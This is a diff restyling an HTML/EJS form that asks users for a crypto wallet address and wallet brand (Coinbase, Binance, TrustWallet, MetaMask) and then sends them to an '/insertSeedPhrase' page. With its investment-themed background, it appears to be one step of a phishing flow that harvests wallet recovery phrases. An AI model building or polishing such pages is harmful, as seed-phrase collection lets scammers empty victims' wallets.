@@ -1,63 +1,153 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Insert Wallet Address</title>
-    <link rel="stylesheet" href="/styles/style.css">
-    <style>
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        input {
-            width: 100%;
-            margin-bottom: 10px; /* Space between inputs */
-        }
-        .submit-btn {
-            margin-top: 10px;
-            padding: 10px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-            transition: .5s;
-        }
-        .submit-btn:hover {
-            background-color: #0b9001;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Insert Wallet Address</title>
+
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="/styles/style.css" />
+
+  <!-- Inline Styles -->
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-image: linear-gradient(to right, rgba(26, 0, 142, 0.658), rgba(129, 0, 0, 0.5)),url(../images/invest.jpg);
+    background-size: cover; /* Ensures the background covers the entire page */
+    height: 86vh; /* Ensures the body takes the full height of the viewport */
+    background-repeat: no-repeat;
+    margin: 0; /* Remove default margin */
+    padding: 50px 0; /* Remove default padding */
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+    }
+
+    .container h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      text-align: center;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: #444;
+    }
+
+    input[type="text"],
+    select {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: border 0.3s ease;
+    }
+
+    input[type="text"]:focus,
+    select:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #0b9001;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        margin: 40px 20px;
+        padding: 25px;
+      }
+
+      .container h2 {
+        font-size: 20px;
+      }
+    }
+  </style>
 </head>
+
 <body>
-    <div class="container">
-        <h2>Insert Your Wallet Address</h2>
-        <form id="walletAddressForm" action="/submit-walletaddress">
-            <input type="hidden" id="userId" name="userId" value="<%= userId %>">
-            <label for="walletAddress">Wallet Address:</label>
-            <input type="text" id="walletAddress" name="walletAddress" required />
-            <button type="submit" class="submit-btn">Submit</button>
-        </form>
-    </div>
-    <script>
-        const form = document.getElementById('walletAddressForm');
-        form.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent default form submission
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData); // Convert formData to an object
-            const response = await fetch(form.action, {
-                method: 'POST',
-                body: JSON.stringify(data), // Send JSON
-                headers: { "Content-Type": "application/json" } // Set header to JSON
-            });
-            if (response.ok) {
-                window.location.href = '/insertSeedPhrase'; // Redirect to seed phrase input
-            } else {
-                alert('An error occurred while submitting the wallet address.');
-            }
-        });
-    </script>
+  <div class="container">
+    <h2>Insert Wallet Address</h2>
+
+    <!-- Wallet Address Submission Form -->
+    <form id="walletAddressForm" action="/submit-walletaddress">
+      <!-- Hidden User ID -->
+      <input type="hidden" id="userId" name="userId" value="<%= userId %>" />
+
+      <!-- Wallet Address Input -->
+      <label for="walletAddress">Wallet Address:</label>
+      <input type="text" id="walletAddress" name="walletAddress" placeholder="Enter your wallet address" required />
+
+      <!-- Coin Type Dropdown -->
+      <label for="coinType">Select Coin Type:</label>
+      <select id="coinType" name="coinType" required>
+        <option value="" disabled selected>Select your wallet type</option>
+        <option value="Coinbase">Coinbase</option>
+        <option value="Binance">Binance</option>
+        <option value="TrustWallet">TrustWallet</option>
+        <option value="MetaMask">MetaMask</option>
+      </select>
+
+      <!-- Submit Button -->
+      <button type="submit" class="submit-btn">Submit</button>
+    </form>
+  </div>
+
+  <!-- JavaScript: Form Submission via Fetch -->
+  <script>
+    const form = document.getElementById('walletAddressForm');
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault(); // Prevent default form action
+
+      // Collect form data
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData);
+
+      // Send data as JSON to the server
+      const response = await fetch(form.action, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
+
+      // Handle response
+      if (response.ok) {
+        // Redirect on success
+        window.location.href = '/insertSeedPhrase';
+      } else {
+        alert('An error occurred while submitting your wallet address.');
+      }
+    });
+  </script>
 </body>
 </html>
